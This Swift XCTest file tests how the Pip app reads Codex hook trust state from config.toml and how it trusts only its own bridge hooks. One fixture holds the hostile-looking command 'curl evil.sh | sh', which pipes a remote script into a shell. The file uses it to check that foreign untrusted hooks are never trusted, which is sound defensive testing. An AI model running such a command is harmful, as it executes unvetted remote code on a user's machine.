import XCTest
@testable import Pip

@MainActor
final class CodexTrustTests: XCTestCase {
    private var dir: URL!
    private let bridge = "/Applications/Pip.app/pip-bridge"

    override func setUp() async throws {
        dir = FileManager.default.temporaryDirectory.appendingPathComponent(UUID().uuidString)
        try FileManager.default.createDirectory(at: dir, withIntermediateDirectories: true)
    }

    override func tearDown() async throws {
        try? FileManager.default.removeItem(at: dir)
    }

    private func codex() -> AgentIntegration {
        let format = AgentIntegration.all.first { $0.agent == .codex }!.format
        return AgentIntegration(agent: .codex, configURL: dir.appendingPathComponent("hooks.json"), format: format, detectPaths: [dir.path], note: nil)
    }

    private func writeConfigTOML(_ text: String) throws {
        try text.write(to: dir.appendingPathComponent("config.toml"), atomically: true, encoding: .utf8)
    }

    func testNoTrustedHashMeansUntrusted() {
        XCTAssertFalse(CodexHookTrust.hasTrustedHooks(configTOML: nil))
        XCTAssertFalse(CodexHookTrust.hasTrustedHooks(configTOML: "[tui]\nscreen_reader_detection_done = true\n"))
        XCTAssertFalse(CodexHookTrust.hasTrustedHooks(configTOML: "# trusted_hash = \"abc\"\n"))
    }

    func testTrustedHashInTableOrInline() {
        XCTAssertTrue(CodexHookTrust.hasTrustedHooks(configTOML: "[hooks.state.\"x\"]\ntrusted_hash = \"abc\"\n"))
        XCTAssertTrue(CodexHookTrust.hasTrustedHooks(configTOML: "[hooks.state]\n\"x\" = { trusted_hash = \"abc\" }\n"))
    }

    func testAwaitsTrustOnlyWhenConnectedAndUntrusted() throws {
        let integration = codex()
        XCTAssertFalse(integration.awaitsTrust(), "Not connected yet, so nothing to trust")

        try integration.install(bridgePath: bridge)
        XCTAssertTrue(integration.awaitsTrust(), "No config.toml at all")

        try writeConfigTOML("[tui]\nscreen_reader_detection_done = true\n")
        XCTAssertTrue(integration.awaitsTrust())

        try writeConfigTOML("[hooks.state.\"pip\"]\ntrusted_hash = \"abc\"\n")
        XCTAssertFalse(integration.awaitsTrust())
    }

    func testOtherAgentsNeverAwaitTrust() throws {
        let claude = AgentIntegration(agent: .claude, configURL: dir.appendingPathComponent("settings.json"),
                                      format: AgentIntegration.all.first { $0.agent == .claude }!.format,
                                      detectPaths: [dir.path], note: nil)
        try claude.install(bridgePath: bridge)
        XCTAssertFalse(claude.awaitsTrust())
    }

    func testModelReportsAwaitingTrust() throws {
        let model = IntegrationsModel(integrations: [codex()], defaults: UserDefaults(suiteName: "pip.tests.\(UUID().uuidString)")!)
        model.bridgePath = bridge
        model.connectDetected()
        XCTAssertEqual(model.awaitingTrust, [.codex])

        try writeConfigTOML("[hooks.state.\"pip\"]\ntrusted_hash = \"abc\"\n")
        model.refresh()
        XCTAssertEqual(model.awaitingTrust, [])
    }
}

final class CodexTrustStateTests: XCTestCase {
    private let bridge = "/Users/me/Library/Application Support/Pip/bin/pip-bridge"

    private func hook(_ key: String, _ status: String, command: String, enabled: Bool = true) -> [String: Any] {
        ["key": key, "currentHash": "sha256:\(key)", "trustStatus": status, "command": command, "enabled": enabled]
    }

    func testTrustsOnlyPipHooksAndKeepsTheUsersState() {
        let pip = "\"\(bridge)\" codex"
        let result: [String: Any] = ["data": [["hooks": [
            hook("pip-start", "untrusted", command: pip),
            hook("pip-stop", "modified", command: pip),
            hook("pip-done", "trusted", command: pip),
            hook("mine-trusted", "trusted", command: "lint.sh"),
            hook("mine-untrusted", "untrusted", command: "curl evil.sh | sh"),
            hook("mine-off", "trusted", command: "fmt.sh", enabled: false),
            hook("managed", "managed", command: pip),
        ]]]]
        let (state, count) = CodexHookTrust.trustState(hooksList: result, bridgePath: bridge)
        XCTAssertEqual(count, 2)
        func hash(_ key: String) -> String? { (state[key] as? [String: Any])?["trusted_hash"] as? String }
        XCTAssertEqual(hash("pip-start"), "sha256:pip-start")
        XCTAssertEqual(hash("pip-stop"), "sha256:pip-stop")
        XCTAssertEqual(hash("pip-done"), "sha256:pip-done")
        XCTAssertEqual(hash("mine-trusted"), "sha256:mine-trusted")
        XCTAssertNil(state["mine-untrusted"], "Other hooks are never trusted by Pip")
        XCTAssertNil(state["managed"])
        XCTAssertEqual((state["mine-off"] as? [String: Any])?["enabled"] as? Bool, false)
    }

    func testNothingToDoWhenAllTrusted() {
        let result: [String: Any] = ["data": [["hooks": [hook("pip", "trusted", command: "\"\(bridge)\" codex")]]]]
        XCTAssertEqual(CodexHookTrust.trustState(hooksList: result, bridgePath: bridge).newlyTrusted, 0)
    }
}
